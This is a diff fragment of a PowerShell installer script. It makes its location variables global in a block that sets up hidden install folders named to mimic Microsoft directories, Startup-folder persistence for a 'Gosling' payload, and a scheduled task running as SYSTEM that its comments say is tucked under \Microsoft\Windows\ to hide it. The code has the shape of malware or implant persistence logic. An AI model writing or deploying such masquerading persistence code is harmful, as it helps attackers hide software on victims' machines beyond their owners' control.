@@ -25,26 +25,26 @@ param (
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
 if ($isAdmin) {
     Write-Host "Context: Administrator" -ForegroundColor Cyan
-    $installPath = "$env:ProgramFiles\WinProcs"
+    $global:installPath = "$env:ProgramFiles\WinProcs"
     # create backup location to hide files
-    $backupPath = "$env:ProgramFiles\Microsoft Procs"
+    $global:backupPath = "$env:ProgramFiles\Microsoft Procs"
     # Gosling location
-    $goslingPath = "$env:ProgramFiles\MicrosoftUU"
-    $goslingstartup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 
+    $global:goslingPath = "$env:ProgramFiles\MicrosoftUU"
+    $global:goslingstartup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 
     # options for scheduled task
-    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-    $taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
+    $global:principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+    $global:taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
 } else {
     Write-Host "Context: Standard User ($env:USERNAME)" -ForegroundColor Cyan
-    $installPath = "$env:USERPROFILE\AppData\Local\WinProcs"
+    $global:installPath = "$env:USERPROFILE\AppData\Local\WinProcs"
     # create backup location to hide files
-    $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
+    $global:backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
     # Gosling location
-    $goslingPath = "$env:USERPROFILE\AppData\Local\MicrosoftUU"
-    $goslingstartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $global:goslingPath = "$env:USERPROFILE\AppData\Local\MicrosoftUU"
+    $global:goslingstartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     # options for scheduled task
-    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
-    $taskpath = "\" # Place the task in a subfolder to hide it
+    $global:principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
+    $global:taskpath = "\" # Place the task in a subfolder to hide it
 }
 
 function unpackgoose {
